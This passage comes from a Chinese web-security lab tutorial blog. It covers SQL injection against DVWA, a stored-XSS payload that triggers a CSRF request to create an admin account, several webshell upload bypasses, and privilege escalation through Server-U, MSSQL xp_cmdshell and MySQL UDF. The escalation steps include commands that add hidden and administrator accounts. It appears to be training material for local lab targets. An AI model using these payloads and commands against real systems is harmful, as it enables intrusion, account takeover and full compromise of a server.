--</span><br></pre></td></tr></table></figure><p>获得操作系统信息。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214936.png"></p><p>11.通过注入：<code>1&#39; and 1=2 union select 1,schema_name from information_schema.schemata -- </code>查询所有数据库名字。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214855.png"></p><p>12.通过注入：<code>1&#39; and exists(select * from 表名) --</code>猜解dvwa数据库中的表名。测试表名为users。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214903.png"></p><p>13.猜解字段名：<code>1&#39; and exists(select 表名 from users) --</code>,测试的字段名为first_name,last_name。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214856.png"></p><p>14.爆出数据库中字段的内容<code>1&#39; and 1=2 union select first_name,last_name from users --</code>,这里其实如果是存放管理员账户的表，那么用户名，密码信息字段就可以爆出来了。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214935.png"></p></blockquote><p><strong>源码分析：</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214904.png"></p><blockquote><p>通过代码可以看出，对输入$id的值没有进行任何过滤就直接放入了SQL语句中进行处理，这样带来了极大的隐患。</p></blockquote><h3 id="2-中安全等级代码分析"><a href="#2-中安全等级代码分析" class="headerlink" title="2.中安全等级代码分析"></a>2.中安全等级代码分析</h3><p><strong>源码分析：</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214937.png"></p><blockquote><p>通过源代码可以看出，在中等级别时对输入的$id的值使用mysql_real_eascape_string()函数进行了处理。在PHP中，使用mysql_real_escape_string()函数用来转义SQL语句中使用字符串的特殊字符。但是使用这个函数对参数进行转换是存在绕过的。只需要将攻击字符进行转换一下编码格式即可绕过该防护函数。比如使用url编码等方式。同时发现SQL语句中变成了“WHERE user_id &#x3D; $id”，此处变成了<strong>数字型</strong>注入，所以此处使用mysql_real_escape_string()函数并没有起到防护的作用。可以通过类似于“1 or 1&#x3D; 1”的语句来进行注入。</p></blockquote><h3 id="3-高安全等级代码分析"><a href="#3-高安全等级代码分析" class="headerlink" title="3.高安全等级代码分析"></a>3.高安全等级代码分析</h3><p><strong>源码分析：</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214927.png"></p><blockquote><p>从源代码中可以看出，此处认为<strong>字符型</strong>注入。对传入$id的值使用stripslashes()函数处理以后，在经过到$mysql_real_escape_string()函数进行第二次过滤。在默认情况下，PHP会对所有的GET，POST和cookie数据自动运行addslashes()，adslashers()函数返回在预定义字符之前添加反斜杠的字符串。就是将“’”变成“\’”，Stripslashes()函数则是删除由addslashes()函数添加的反斜杠。在使用两个函数进行过滤之后再使用is_numric()函数检查$id的值是否为数字，彻底断绝了注入的存在。此种防护不存在绕过的可能。</p></blockquote><h1 id="跨站脚本技术"><a href="#跨站脚本技术" class="headerlink" title="跨站脚本技术"></a>跨站脚本技术</h1><hr><h2 id="Csrf利用管理员权限创建后台管理账户"><a href="#Csrf利用管理员权限创建后台管理账户" class="headerlink" title="Csrf利用管理员权限创建后台管理账户"></a>Csrf利用管理员权限创建后台管理账户</h2><p><strong>原理：</strong>通过普通用户的存储型XSS实现创建管理员账户的CSRF利用</p><p><strong>实验步骤：</strong></p><blockquote><p>1.注册一个用户。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215643.png"></p><p>2.来到“添加物品”处。此处是存在存储型XSS的。添加以下信息，点击“提交”。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215644.png"></p><p>3.点击“首页”，看到刚才添加的物品信息，点击打开。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215649.png"></p><p>4.弹出信息。说明漏洞存在。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215645.png"></p><p>5.再次编辑“添加物品”处提交的内容，其中“物品简介”项的内容如下：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215646.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&gt;<span class="keyword">function</span> <span class="title function_">loadXMLDoc</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&gt;&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&gt;<span class="keyword">var</span> xmlhttp;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&gt;<span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> &#123;<span class="comment">// code for IE7+, Firefox, Chrome, Opera, Safari</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&gt;<span class="keyword">else</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> &#123;<span class="comment">// code for IE6, IE5</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> xmlhttp=<span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&gt;xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span>==<span class="number">4</span> &amp;&amp; xmlhttp.<span class="property">status</span>==<span class="number">200</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">   &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">   <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myDiv&quot;</span>).<span class="property">innerHTML</span>=xmlhttp.<span class="property">responseText</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">   &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&gt;xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot; http://192.168.1.3:8007/admin/admin_usersetting.asp&quot;</span>,<span class="literal">true</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&gt;xmlhttp.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&gt;xmlhttp.<span class="title function_">send</span>(<span class="string">&quot;action=add&amp;UserName=zhangsan&amp;PassWord=123456&amp;isActive=1&amp;isAdmin=1&amp;pubSubCateID=91&amp;Submit=+%C8%B7+%B6%A8+&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&gt;&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&gt;<span class="title function_">loadXMLDoc</span>()</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>6.点击“首页”，回到首页，退出zhangsan用户。</p><p>7.输入后台路径<code>【http://192.168.1.3:8007/admin/user.asp】</code>使用【admin&#x2F;admin888】，登录后台。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215647.png"></p><p>8.此时回到首页，浏览器输入：<code>http://192.168.1.3:8007</code>，查看帖子rty，点击了此条物品消息，没有什么异常现象。</p><p>9.此时管理员再次进入自己的后台：<code>【http://192.168.1.3:8007/admin/user.asp】</code>在“系统用户管理”中，发现多了一个账户zhangsan。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215648.png"></p></blockquote><h2 id="跨站脚本攻击之存储型XSS"><a href="#跨站脚本攻击之存储型XSS" class="headerlink" title="跨站脚本攻击之存储型XSS"></a>跨站脚本攻击之存储型XSS</h2><p><strong>实验步骤：</strong></p><blockquote><p>1.由于对用户的输入过滤不严导致XSS，所以一般XSS会存在在交互页面,比如留言板、登录框等。点击【在线留言】，进入在线留言页面。</p><p>2.在交互页面提交请求，进行尝试输入不同的内容，寻找XSS漏洞存在的点。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214912.png"></p><p>3.交互界面返回信息。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214910.png"></p><p>4.经过页面提交留言测试，发现留言标题文本框对输入的文字长度进行了限制,所以,我们的这一次尝试是失败的，我们需要调整XSS代码以绕过防护。</p><p>5.这里使用注释的方式绕过代码对长度的限制。对交互页面进行输入恶意代码。我们先尝试提交<code>*/&lt;/script&gt;</code>点击提交。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215650.png"></p><p>6.显示提交成功，我们继续提交下一段代码<code>&lt;script&gt;alert(/xss/)/*</code>来配合上一段代码执行。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214900.png"></p><p>7.当管理员进入管理后台，进入留言管理，会触发用户输入的恶意代码，成功弹窗。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214859.png"></p><p>8.后台页面源代码里显示<code>&lt;script&gt;alert(/xss/)/*其他标签和内容``*/&lt;/script&gt;</code></p></blockquote><h1 id="webshell上传"><a href="#webshell上传" class="headerlink" title="webshell上传"></a>webshell上传</h1><hr><h2 id="绕过前台脚本检测扩展名上传webshell"><a href="#绕过前台脚本检测扩展名上传webshell" class="headerlink" title="绕过前台脚本检测扩展名上传webshell"></a>绕过前台脚本检测扩展名上传webshell</h2><p><strong>原理：</strong></p><blockquote><p>当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为前台脚本检测扩展名。</p></blockquote><p><strong>方法：</strong></p><blockquote><p>绕过前台脚本检测扩展名，就是将所要上传文件的扩展名更改为符合脚本检测规则的扩展名，通过BurpSuite工具，截取数据包，并将数据包中文件扩展名更改回原来的，达到绕过的目的。</p></blockquote><h2 id="绕过Content-Type检测文件类型上传"><a href="#绕过Content-Type检测文件类型上传" class="headerlink" title="绕过Content-Type检测文件类型上传"></a>绕过Content-Type检测文件类型上传</h2><p><strong>原理：</strong></p><blockquote><p>当浏览器在上传文件到服务器的时候，服务器对上传文件的Content-Type类型进行检测，如果是白名单允许的，则可以正常上传，否则上传失败。</p></blockquote><p><strong>方法：</strong></p><blockquote><p>绕过Content—Type文件类型检测，就是用BurpSuite截取并修改数据包中文件的Content-Type类型，使其符合白名单的规则，达到上传的目的。</p></blockquote><h2 id="绕过服务器端扩展名检测上传"><a href="#绕过服务器端扩展名检测上传" class="headerlink" title="绕过服务器端扩展名检测上传"></a>绕过服务器端扩展名检测上传</h2><p><strong>原理：</strong></p><blockquote><p>当浏览器将文件提交到服务器端的时候，服务器端会根据设定的黑白名单对浏览器提交上来的文件扩展名进行检测，如果上传的文件扩展名不符合黑白名单的限制，则不予上传，否则上传成功。</p></blockquote><p><strong>方法：</strong></p><blockquote><p>本实例中，将一句话木马的文件名【lubr.php】，改成【lubr.php.abc】。首先，服务器验证文件扩展名的时候，验证的是【.abc】，只要该扩展名符合服务器端黑白名单规则，即可上传。另外，当在浏览器端访问该文件时，Apache如果解析不了【.abc】扩展名，会向前寻找可解析的扩展名，即【.php】。一句话木马可以被解析，即可通过中国菜刀连接。</p></blockquote><h2 id="利用00截断上传webshell"><a href="#利用00截断上传webshell" class="headerlink" title="利用00截断上传webshell"></a>利用00截断上传webshell</h2><p><strong>原理：</strong></p><blockquote><p>利用00截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生0x00上传截断漏洞。<br>假设文件的上传路径为【<code>http://xx.xx.xx.xx/upfiles/lubr.php.jpg</code>】，通过抓包截断将【lubr.php】后面的【.】换成【0x00】。在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束，从而将【lubr.php.jpg】的内容写入到【lubr.php】中，从而达到攻击的目的。</p></blockquote><p><strong>方法：</strong></p><blockquote><p>将木马文件（lubr.php）的后缀名【.php】改为【.php.jpg】，点击【上传】。</p><p>在BurpSuite中会抓到截取的数据包，点击【hex】，进入到十六进制源码界面。</p><p>找到【lubr.php.jpg】对应的十六进制源码，将【lubr.php】后【.】对应的【2e】改为【00】。</p></blockquote><h2 id="构造图片木马，绕过文件内容检测上传Shell"><a href="#构造图片木马，绕过文件内容检测上传Shell" class="headerlink" title="构造图片木马，绕过文件内容检测上传Shell"></a>构造图片木马，绕过文件内容检测上传Shell</h2><p><strong>原理：</strong></p><blockquote><p>一般文件内容验证使用getweb安全ize()函数检测，会判断文件是否是一个有效的文件图片，如果是，则允许上传，否则的话不允许上传。</p></blockquote><p><strong>方法：</strong></p><blockquote><p>将一句话木马插入到一个【合法】的图片文件当中。</p><ol><li>随便找一个图片，与所要上传的木马放置于同一文件夹下。</li><li>打开cmd，进入木马所在文件夹。</li><li>输入copy <code>pic.jpg/b+lubr.php/a</code> PicLubr.jpg ，将【lubr.php】插入到【pic.jpg】中。其中 &#x2F;b表示以二进制合并， &#x2F;a表示以ascii合并。而【PicLubr.jpg】就是我们需要上传的图片木马。</li></ol></blockquote><h2 id="南方企业内容管理系统漏洞"><a href="#南方企业内容管理系统漏洞" class="headerlink" title="南方企业内容管理系统漏洞"></a>南方企业内容管理系统漏洞</h2><p><strong>原理：</strong></p><blockquote><p>数据库备份拿webshell</p></blockquote><p><strong>方法：</strong></p><blockquote><p>1.在【荣誉管理】选项卡下，选择【添加企业荣誉】，即可弹出可上传文件页面。</p><p>2.将木马文件【1.asp】改成【1.jpg】，点击上传。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214917.png"></p><p>3.打开【系统管理】下的【数据库备份】，即可进入数据库备份页面，并将刚刚得到的木马文件的路径复制到当前数据库路径中，填写数据库备份名称【ok.asp】。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214934.png"></p><p>4.点击【确定】，即可得到数据库备份的路径【admin\Databackup\ok.asp.asa】。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214852.png"></p><p>5.在火狐浏览器的地址栏中输入完整路径【<code>http://192.168.1.3:8002/admin/Databackup/ok.asp</code>】，即可访问木马，已经成功拿到webshell（密码：123456）。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214933.png"></p></blockquote><h2 id="Fckeditor漏洞上传webshell"><a href="#Fckeditor漏洞上传webshell" class="headerlink" title="Fckeditor漏洞上传webshell"></a>Fckeditor漏洞上传webshell</h2><p><strong>原理：</strong></p><blockquote><p>Fckeditor在2.4.2以下存在一个直接上传任意文件的上传页面，可直接上传webshell。</p><p>此版本fckeditor存在两个上传漏洞页面：<br>（1）FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;browser.html？type&#x3D;Image&amp;connector&#x3D;connectors&#x2F;asp&#x2F;connector.asp<br>（2）FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;asp&#x2F;connector.asp？Command&#x3D;GetFoldersAndFiles&amp;Type&#x3D;zhang&amp;CurrentFolder&#x3D;&#x2F;</p><p>第一个页面是在网站根目录下的userfiles目录下的Image目录下打开一个上传页面，上传的文件都保存在这个目录下；第二个页面是在网站根目录下的userfiles目录下创建一个zhang目录。</p></blockquote><p><strong>方法：</strong></p><blockquote><p>1.打开网站(<code>http://192.168.1.3:8001/fckeditor</code>)判断是否有fckeditor编辑器，出现403禁止访问，说明此目录存在。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214914.png"></p><p>2.判断fckeditor编辑器版本号，输入：<code>http://192.168.1.3:8001/FCKeditor/_whatsnew.html</code>，由返回页面可知此fckeditor编辑器版本为2.0。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214931.png"></p><p>3.打开<code>http://192.168.1.3:8001/FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp</code></p><p>4.经测试jpg后缀文件可上传，asp后缀文件被拦截。所以我们把文件重命名为2.asp.jpg。并利用00截断上传shell。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214913.png"></p></blockquote><h1 id="基于webshell提权"><a href="#基于webshell提权" class="headerlink" title="基于webshell提权"></a>基于webshell提权</h1><hr><h2 id="server-u提权"><a href="#server-u提权" class="headerlink" title="server-u提权"></a>server-u提权</h2><p><strong>原理：</strong></p><blockquote><p>通过webshell读取server-u配置文件，修改配置，添加系统用户。</p></blockquote><p><strong>方法：</strong></p><blockquote><p>1.在浏览器中输入<a href="http://192.168.1.3:8000/webshell.asp%EF%BC%8C%E8%BE%93%E5%85%A5%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81%EF%BC%88123456%EF%BC%89%E3%80%82">http://192.168.1.3:8000/webshell.asp，输入默认密码（123456）。</a></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214906.png"></p><p>2.单击“执行—CMD”, 在右侧中选上复选框“wscript.shell”在输入空中输入命令“netstat -an”,单击执行按钮。利用webshell读取服务器信息，发现服务器系统安装server-u服务,默认端口号<strong>43958</strong>。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214911.png"></p><p>3.单击“Servu-提权”按钮，在命令栏中输入“cmd &#x2F;c net user aaa 123456 &#x2F;add &amp; net localgroup administrators aaa &#x2F;add”，单击提交按钮。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214854.png"></p><p>4.单击“用户——帐号”选项，显示用户aaa已成功添加到系统。</p><p>5.单击“开始”-&gt;“运行“-&gt;输入”cmd”，在命令行下输入“mstsc”。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214922.png"></p><p>6.输入新添加的账号aaa，输入密码“123456”，单击确定，远程连接到目标主机。</p></blockquote><p> <strong>扩展：</strong>在命令行下建立隐藏用户：“net user abc$ &#x2F;add”。 abc是建立的用户名，$符号是表示在dos下面隐藏。</p><h2 id="MSSqlserver-xp-cmdshell提权"><a href="#MSSqlserver-xp-cmdshell提权" class="headerlink" title="MSSqlserver xp_cmdshell提权"></a>MSSqlserver xp_cmdshell提权</h2><p><strong>原理：</strong></p><blockquote><p>通过webshell读取网站数据库连接配置文件，获取数据库连接密码。</p><p>通过webshell上用xp_cmdshell添加系统帐号。</p></blockquote><p><strong>方法：</strong></p><blockquote><ol><li>在浏览器中输入<a href="http://192.168.1.3:8000/2.asp">http://192.168.1.3:8000/2.asp</a> ，输入默认密码（123456）。</li></ol><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214901.png"></p><ol start="2"><li>单击“端口扫描”-&gt;“开始扫描”, 发现<strong>1433</strong>端口开放，安装有mssql数据库。</li></ol><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214918.png"></p><ol start="3"><li>单击“数据库操作”，在右侧下拉列表mssql连接，输入相应的数据库名称master，密码123456。</li></ol><p> 在SQL操作命令中输入“select count(*) from master.dbo.sysobjects where xtype &#x3D; ‘x’ and name &#x3D; ‘xp_cmdshell’”，查看cmd_shell是否开启。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214925.png"></p><ol start="4"><li>命令回显为1，cmd_shell为开启。</li></ol><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214909.png"></p><ol start="5"><li>添加系统账号,在SQL操作命令中输入“Exec master.dbo.xp_cmdshell ‘net user hacker 123456 &#x2F;add’”，没有回显表示命令成功。</li></ol><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214905.png"></p><ol start="6"><li>在SQL操作命令中输入” Exec master.dbo.xp_cmdshell ‘net localgroup administrators hacker &#x2F;add’ “将hacker加入管理员组。</li></ol><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214926.png"></p><ol start="7"><li>单击”scan”按钮，查看端口号。发现3389端口开启着。 <em>3389</em>是远程协助的端口。</li></ol><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214907.png"></p><ol start="8"><li>单击“开始”—&gt;“运行”—&gt;输入“mstsc”,用新加的用户hacker（账号hacker 密码123456）连接服务器（192.168.1.3）远程桌面。</li></ol></blockquote><h2 id="MysqlUDF提权"><a href="#MysqlUDF提权" class="headerlink" title="MysqlUDF提权"></a>MysqlUDF提权</h2><p><strong>原理：</strong></p><blockquote><p>通过webshell读取网站数据库连接配置文件，获取数据库连接密码。</p><p>通过webshell上传mysql-udf文件，添加系统用户。</p></blockquote><p><strong>方法：</strong></p><blockquote><p>1.在浏览器中输入<a href="http://192.168.1.3:8080/webshell.php">http://192.168.1.3:8080/webshell.php</a> ，输入默认密码（admin）。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214902.png"></p><p>2.单击“端口扫描”-&gt;“开始扫描”, 发现<strong>3306</strong>端口开放，安装有Mysql数据库。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214915.png"></p><p>3.利用Mysql_udf提权，单击“mysql-udf提权”，在右侧输入已知的数据库连接用户名和密码（root:123456）,然后单击MYSQL连接即可。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214921.png"></p><p>4.单击“安装DLL”按钮。</p><p>5.在下拉列表框中选择”添加管理员”,单击”执行”按钮。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214924.png"></p><p>6.在下拉列表框中选择”设为管理组”,单击”执行”按钮并加入管理员组。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214928.png"></p><p>7.选择菜单栏中的“CMD命令”，下拉列表框中选择“net user”,然后单击“执行按钮”。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214923.png"></p><p>8.选择菜单栏中的“CMD命令”，下拉列表框中选择“netstat -an”,然后单击“执行按钮”。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214920.png"></p><p>9.单击开始—&gt;运行—&gt;输入“mstsc”—&gt;”192.168.1.3”,用新加的用户spider密码spider连接服务器远程桌面。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
